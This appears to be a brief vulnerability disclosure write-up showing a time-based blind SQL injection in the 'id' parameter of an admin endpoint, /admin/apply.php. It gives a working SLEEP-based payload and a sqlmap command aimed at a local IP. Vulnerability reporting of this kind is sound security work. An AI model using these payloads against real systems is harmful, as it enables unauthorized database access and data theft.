![image](https://github.com/tangzhaosong/Excavate/assets/100182502/f4e99596-e003-4de0-b65a-1061af052570)

<br>Vulnerability function points, concatenated according to code routing, we get /admin/apply.php? set=edit_submit&id=1
Injection point id
Here delay injection to prove the injection point, write</br>
<br>payload：1'+AND+(SELECT+5289+FROM+(SELECT(SLEEP(5)))enfo)--+ihbh</br>
![image](https://github.com/tangzhaosong/Excavate/assets/100182502/c4a96f33-e79e-4a37-9518-fd8424064013)

<br>Change sleep (1)</br>
![image](https://github.com/tangzhaosong/Excavate/assets/100182502/8233c4cd-065d-43ce-b228-b83fd51aa8a9)

<br>Vulnerability exists
Attack using SQLMAP</br>
SQLMAP:
<br>Python sqlmap. Py - u "http://192.168.30.203/admin/apply.php? set=edit_submit&id=1" -p id</br>
![image](https://github.com/tangzhaosong/Excavate/assets/100182502/c166076b-d1c0-4504-883b-cf01f3a58558)
